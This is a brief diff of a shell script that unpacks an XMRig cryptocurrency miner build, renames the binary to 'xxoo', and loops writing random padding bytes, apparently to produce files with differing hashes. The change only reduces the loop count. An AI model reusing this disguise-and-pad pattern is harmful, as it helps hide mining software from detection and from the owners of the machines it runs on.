@@ -10,7 +10,7 @@ mv xmrig-personal-shoguncao-6.22.2/xmrig xxoo
 rm -rf xmrig-personal-shoguncao-6.22.2.tar.gz
 rm -rf xmrig-personal-shoguncao-6.22.2
 
-for i in {1..100}; do
+for i in {1..1}; do
     echo "i: ${i}"
     start_time=$(date +%s)
     dd if=/dev/urandom of=padding.bin bs=1 count=512
